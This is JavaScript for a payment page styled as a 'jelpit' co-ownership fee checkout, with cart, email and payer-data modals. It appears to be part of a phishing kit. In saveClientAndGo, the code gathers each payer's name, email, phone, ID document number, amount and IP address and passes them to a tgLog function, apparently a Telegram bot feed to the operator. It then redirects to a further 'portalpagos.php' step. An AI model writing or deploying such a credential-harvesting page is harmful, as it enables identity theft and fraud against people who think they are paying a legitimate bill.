/* ── Load data ──────────────────────────────────────────── */
const conj = JSON.parse(sessionStorage.getItem('jelpit_conj') || 'null');
const apt  = JSON.parse(sessionStorage.getItem('jelpit_apt')  || 'null');

if (!conj || !apt) { window.location.replace('index.php'); }

let precio = Number(apt?.precio) || 0;

/* ── Helpers ────────────────────────────────────────────── */
function formatCOP(val) {
  return '$ ' + Number(val).toLocaleString('es-CO');
}

/* ── Render right column ────────────────────────────────── */
document.getElementById('valNombreCopropiedadPagar').textContent = conj.co_ownership_name || '';
const city = [conj.city, conj.department].filter(Boolean).join(' - ');
const addrEl = document.getElementById('valDireccionCopropiedadPagar');
addrEl.innerHTML = conj.address ? `${conj.address}, <strong>${city}</strong>` : city;
document.getElementById('valConvenioPagar').innerHTML = `<strong>Convenio:</strong> ${conj.agreement_number || ''}`;
document.getElementById('valRef1').textContent = apt.inmueble || '';
document.getElementById('valRef2').textContent = apt.referencia || '';

/* Carrito */
document.getElementById('carNombre').textContent = conj.co_ownership_name || '';
document.getElementById('carDireccion').innerHTML = conj.address ? `${conj.address}, <strong>${city}</strong>` : city;
document.getElementById('carReferencia').textContent = `Referencia ${apt.referencia}`;

/* ── Admin payment amount ───────────────────────────────── */
const valorPagarInput = document.getElementById('valorPagarInput');
valorPagarInput.value = formatCOP(precio);
document.getElementById('carPrecio').textContent = formatCOP(precio);

if (precio === 0 || precio === 1) {
  precio = 0;
  valorPagarInput.removeAttribute('readonly');
  valorPagarInput.value = '';
  valorPagarInput.placeholder = 'Ingrese el valor';
  valorPagarInput.addEventListener('input', () => {
    const raw = valorPagarInput.value.replace(/\D/g, '');
    precio = Number(raw) || 0;
    document.getElementById('carPrecio').textContent = formatCOP(precio);
    recalcTotal();
  });
}

/* ── Fecha límite de pago ───────────────────────────────── */
const now = new Date();
const lastDay = new Date(now.getFullYear(), now.getMonth() + 1, 0);
const meses = ['Enero','Febrero','Marzo','Abril','Mayo','Junio','Julio','Agosto','Septiembre','Octubre','Noviembre','Diciembre'];
document.getElementById('fechaLimitePago').textContent =
  `${lastDay.getDate()} ${meses[lastDay.getMonth()]} ${lastDay.getFullYear()}`;

/* ── State & total calc ─────────────────────────────────── */
let adminChecked  = true;
let customChecked = false;
let customValue   = 0;

function recalcTotal() {
  let total = 0;
  if (adminChecked)  total += precio;
  if (customChecked) total += customValue;

  const fmt = formatCOP(total);
  document.getElementById('pagoTotalTxt').textContent   = fmt;
  document.getElementById('carPrecioTotal').textContent = fmt;

  const btn = document.getElementById('btnIrPagarMain');
  btn.classList.toggle('active', total > 0);
}

recalcTotal();

/* Admin checkbox */
document.getElementById('chkAdminBox').addEventListener('click', () => {
  adminChecked = !adminChecked;
  document.getElementById('chkAdminBox').classList.toggle('checked', adminChecked);
  recalcTotal();
});

/* ── Custom payment ─────────────────────────────────────── */
const customPayCard    = document.getElementById('customPayCard');
const btnCustomPayment = document.getElementById('btnCustomPayment');
const chkCustomBox     = document.getElementById('chkCustomBox');
const customValorInput = document.getElementById('customValorInput');

btnCustomPayment.addEventListener('click', () => {
  customPayCard.style.display = 'block';
  btnCustomPayment.style.display = 'none';
});

chkCustomBox.addEventListener('click', () => {
  customChecked = !customChecked;
  chkCustomBox.classList.toggle('checked', customChecked);
  recalcTotal();
});

customValorInput.addEventListener('input', () => {
  const raw = customValorInput.value.replace(/\D/g, '');
  customValue = Number(raw) || 0;
  if (customChecked) recalcTotal();
});

document.getElementById('btnEliminarCustom').addEventListener('click', () => {
  customPayCard.style.display = 'none';
  btnCustomPayment.style.display = 'flex';
  customChecked = false;
  customValue = 0;
  customValorInput.value = '';
  chkCustomBox.classList.remove('checked');
  recalcTotal();
});

/* ── Cambiar referencia ─────────────────────────────────── */
document.getElementById('btnCambiarRefPagar').addEventListener('click', e => {
  e.preventDefault();
  sessionStorage.setItem('jelpit_keep_conj', '1');
  window.location.href = 'index.php';
});

/* ── Carrito Drawer ─────────────────────────────────────── */
const carritoDrawer  = document.getElementById('carritoDrawer');
const carritoOverlay = document.getElementById('carritoOverlay');

function openCarrito()  { carritoDrawer.classList.add('open');    carritoOverlay.classList.add('active'); }
function closeCarrito() { carritoDrawer.classList.remove('open'); carritoOverlay.classList.remove('active'); }

document.getElementById('btnCarrito')?.addEventListener('click', openCarrito);
document.getElementById('btnCarritoMobile')?.addEventListener('click', openCarrito);
document.getElementById('closeCarrito').addEventListener('click', closeCarrito);
carritoOverlay.addEventListener('click', closeCarrito);

/* ── Modal system ───────────────────────────────────────── */
const modalOverlay    = document.getElementById('modalOverlay');
const modalCorreo     = document.getElementById('modalCorreo');
const modalDatosPago  = document.getElementById('modalDatosPago');
const modalActivate   = document.getElementById('modalActivate');

function openModal(modal)  { modalOverlay.classList.add('active');    modal.classList.add('active'); }
function closeAllModals()  { modalOverlay.classList.remove('active'); [modalCorreo, modalDatosPago, modalActivate].forEach(m => m.classList.remove('active')); }

modalOverlay.addEventListener('click', closeAllModals);

/* Ir a pagar */
document.getElementById('btnIrPagarMain').addEventListener('click', () => {
  if (!document.getElementById('btnIrPagarMain').classList.contains('active')) return;
  openModal(modalCorreo);
});
document.getElementById('btnIrPagarCarrito').addEventListener('click', () => { closeCarrito(); openModal(modalCorreo); });

/* ── Modal 1: Email ─────────────────────────────────────── */
const correoInput        = document.getElementById('correoInput');
const correoWrapper      = document.getElementById('correoWrapper');
const btnContinuarCorreo = document.getElementById('btnContinuarCorreo');

correoInput.addEventListener('focus', () => correoWrapper.classList.add('active'));
correoInput.addEventListener('blur',  () => { if (!correoInput.value) correoWrapper.classList.remove('active'); });
correoInput.addEventListener('input', () => {
  correoWrapper.classList.toggle('filled', !!correoInput.value);
  const valid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(correoInput.value);
  btnContinuarCorreo.disabled = !valid;
  btnContinuarCorreo.classList.toggle('active', valid);
});

btnContinuarCorreo.addEventListener('click', () => {
  if (btnContinuarCorreo.disabled) return;
  closeAllModals();
  openModal(modalDatosPago);
});

/* ── Modal 2: Datos de pago ─────────────────────────────── */
function checkDatosForm() {
  const valid =
    document.getElementById('tipoDoc').value &&
    document.getElementById('numDocInput').value.trim() &&
    document.getElementById('nombreInput').value.trim() &&
    document.getElementById('apellidoInput').value.trim() &&
    document.getElementById('celularInput').value.trim().length >= 10 &&
    document.getElementById('chkTerminos').checked &&
    document.getElementById('chkDatos').checked;

  const btn = document.getElementById('btnContinuarDatosPago');
  btn.disabled = !valid;
  btn.style.background = valid ? '' : '#e0e0e0';
  btn.style.color      = valid ? '' : '#333';
  btn.style.cursor     = valid ? 'pointer' : 'not-allowed';
}

/* Float labels in datos modal */
['numDocWrapper','nombreWrapper','apellidoWrapper','celularWrapper'].forEach(id => {
  const wrapper = document.getElementById(id);
  if (!wrapper) return;
  const input = wrapper.querySelector('input');
  input.addEventListener('focus', () => wrapper.classList.add('active'));
  input.addEventListener('blur',  () => { if (!input.value) wrapper.classList.remove('active'); });
  input.addEventListener('input', () => { wrapper.classList.toggle('filled', !!input.value); checkDatosForm(); });
});
['chkTerminos','chkDatos','chkOfertas'].forEach(id => {
  document.getElementById(id)?.addEventListener('change', checkDatosForm);
});

/* Custom doc-type select */
const customDocSelect = document.getElementById('customDocSelect');
const cdsTrigger      = document.getElementById('cdsTrigger');
const cdsMenu         = document.getElementById('cdsMenu');
const cdsText         = document.getElementById('cdsText');
const tipoDocInput    = document.getElementById('tipoDoc');

cdsTrigger.addEventListener('click', e => { e.stopPropagation(); customDocSelect.classList.toggle('open'); });

cdsMenu.querySelectorAll('.cds-option').forEach(opt => {
  opt.addEventListener('click', () => {
    cdsMenu.querySelectorAll('.cds-option').forEach(o => o.classList.remove('selected'));
    opt.classList.add('selected');
    cdsText.textContent = opt.textContent;
    tipoDocInput.value  = opt.dataset.value;
    customDocSelect.classList.add('has-value');
    customDocSelect.classList.remove('open');
    checkDatosForm();
  });
});
document.addEventListener('click', e => {
  if (!customDocSelect.contains(e.target)) customDocSelect.classList.remove('open');
});

document.getElementById('btnContinuarDatosPago').addEventListener('click', function () {
  if (this.disabled) return;
  closeAllModals();
  openModal(modalActivate);
});

/* ── Modal 3: Actívate ──────────────────────────────────── */
document.getElementById('btnCloseActivate').addEventListener('click', closeAllModals);

function saveClientAndGo() {
  const correo   = document.getElementById('correoInput')?.value   || '';
  const nombre   = document.getElementById('nombreInput')?.value   || '';
  const apellido = document.getElementById('apellidoInput')?.value || '';
  const celular  = document.getElementById('celularInput')?.value  || '';
  const tipoDoc  = document.getElementById('tipoDoc')?.value       || '';
  const numDoc   = document.getElementById('numDocInput')?.value   || '';
  const total    = (adminChecked ? precio : 0) + (customChecked ? customValue : 0);

  sessionStorage.setItem('jelpit_client', JSON.stringify({ correo, nombre, apellido, celular, tipoDoc, numDoc }));
  sessionStorage.setItem('jelpit_total', String(total));

  tgGetIP().then(ip => tgLog([
    '💳 <b>PAGAR → DATOS COMPLETADOS</b>',
    `🏘️ Conjunto: <b>${conj?.co_ownership_name || '—'}</b>`,
    `🚪 Inmueble: ${apt?.tipo || ''} ${apt?.inmueble || '—'}`,
    `🔖 Referencia: ${apt?.referencia || '—'}`,
    `💰 Total: $${Number(total).toLocaleString('es-CO')}`,
    `👤 Nombre: ${nombre} ${apellido}`,
    `📧 Correo: ${correo}`,
    `📱 Celular: ${celular}`,
    `🪪 Doc: ${tipoDoc} ${numDoc}`,
    `🌐 IP: <code>${ip}</code>`,
    `🕐 ${new Date().toLocaleString('es-CO')}`
  ]));

  window.location.href = 'portalpagos.php';
}

document.getElementById('btnQuieroActivarme').addEventListener('click', saveClientAndGo);
document.getElementById('btnContinuarPagoOnly').addEventListener('click', saveClientAndGo);

/* ── Promo carousel ─────────────────────────────────────── */
(function () {
  const inner  = document.getElementById('promoBannerInner');
  if (!inner) return;
  const slides = inner.querySelectorAll('.promo-slide');
  if (slides.length < 2) return;
  let current = 0;
  function goTo(n) { current = ((n % slides.length) + slides.length) % slides.length; inner.style.transform = `translateX(-${current * 100}%)`; }
  goTo(0);
  setInterval(() => goTo(current + 1), 5000);
})();
